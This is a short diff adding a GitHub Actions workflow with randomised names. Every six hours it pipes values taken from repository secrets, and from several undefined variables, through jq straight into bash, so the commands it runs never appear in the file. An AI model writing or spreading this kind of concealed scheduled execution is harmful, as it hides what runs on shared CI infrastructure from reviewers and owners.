@@ -1,0 +1,20 @@
+name: guojinjun5317
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: guojinjun5317
+        env:
+          ouaua8: ${{ secrets.ouaua8 }}
+        run: |
+          echo $ouaua8 | jq -r .cy28 | /bin/bash
+          echo $ivdwr436 | jq -r .ml712 | /bin/bash
+          echo $fwkt9 | jq -r .owwjx29792 | /bin/bash
+          echo $ltruh144 | jq -r .gxawk922 | /bin/bash
+          echo $t219 | jq -r .vw1420 | /bin/bash
+
